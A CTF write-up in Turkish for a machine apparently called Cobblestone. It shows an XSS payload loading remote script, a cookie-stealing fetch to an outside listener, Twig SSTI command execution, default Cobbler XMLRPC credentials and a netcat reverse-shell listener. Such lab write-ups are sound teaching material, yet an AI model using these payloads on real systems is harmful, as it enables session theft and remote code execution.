## Foothold — XSS → Admin Cookie

### XSS Tespiti

`suggest_skin.php`'nin `name` alanına basit bir payload deneyin:

```html
<script src="http://ip:8888/xss.js"></script>
```

Öneriyi gönderdikten ~1-2 dakika sonra Kali'deki HTTP sunucusuna istek geldi. Demek ki admin botu periyodik olarak yeni önerilere bakıyor ve `name` alanı filtrelenmemiş.

### Admin Oturumunu Ele Geçirme

`preview_banner.php` admin-only bir endpoint. Siteye baktığımda `skins_app_admin_server_info.php` dosyasının `phpinfo()` çıktısı verdiğini fark ettim. XSS ile bu sayfayı admin botuna yükletip `PHPSESSID` cookie'sini sızdırabildim.

```javascript
// xss.js
var exfil = 'http://ip:9003';

fetch('/skins_app_admin_server_info.php', {credentials: 'include'})
  .then(r => r.text())
  .then(d => {
    var match = d.match(/PHPSESSID[^;]*/);
    fetch(exfil + '/?p=cookie&d=' + encodeURIComponent(match ? match[0] : d.substr(0,200)));
  });
```

Cookie geldi: `PHPSESSID=*`

Artık admin oturumu elimde, `preview_banner.php`'ye direkt POST atabiliyorum.

## User Flag — Twig SSTI → Veritabanı → cobble SSH

### Twig Server-Side Template Injection

`preview_banner.php` POST body'sinde `first` parametresini Twig template olarak işliyor:

```php
$first = $_POST['first'] ?? null;
echo $twig->render('header.html.twig', ['first' => $twig->createTemplate($first)->render()]);
```

Basit test:

```bash
curl -s -b "PHPSESSID=*" \
  -X POST 'http://cobblestone.htb/preview_banner.php' \
  --data-urlencode "first={{7*7}}"
# → Welcome 49
```

SSTI onaylandı. Twig sandbox yok. `|filter('system')` ile komut çalıştırabildim:

```bash
curl -s -b "PHPSESSID=..." \
  -X POST 'http://cobblestone.htb/preview_banner.php' \
  --data-urlencode "first={{['id']|filter('system')}}"
# → uid=33(www-data)
```

### Veritabanı Kimlik Bilgileri

SSTI ile kaynak dosyaları okuyunca `/var/www/html/db/connection.php` içinden MySQL bilgileri çıktı:

## Root Flag — Cobbler XMLRPC rsync Command Injection

### İç Servisleri Keşfetme

SSH'a girdikten sonra açık portlara baktım:

```bash
cat /proc/net/tcp
```

`0100007F:623F` → `127.0.0.1:25151` — Cobbler XMLRPC servisi.

### Port Forward

```bash
ssh -L 25152:127.0.0.1:25152 cobble@cobblestone.htb -fN
```

> **Not:** Servis aslında iki portta dinliyor. Asıl XMLRPC endpoint'i **25152** portu ve **/RPC2** path'i.

### Cobbler XMLRPC Erişimi

Default kimlik bilgileri çalışıyor:

```python
import xmlrpc.client
s = xmlrpc.client.ServerProxy('http://127.0.0.1:25152/RPC2')
t = s.login('cobbler', 'cobbler')
print(s.version())  # → 3.306
```

### background_import — rsync_flags Command Injection

Cobbler'ın `background_import` metodu, `rsync_flags` parametresini doğrudan rsync komutuna geçiriyor. Hiçbir sanitizasyon yok.

Kali'de dinleyiciyi aç:

```bash
nc -lvnp 9001
```

Exploit: *writeup dosyasıyla beraber yükledim*


Shell geldi, `root` olarak:

```
root@cobblestone:~# cat /root/root.txt
*
```
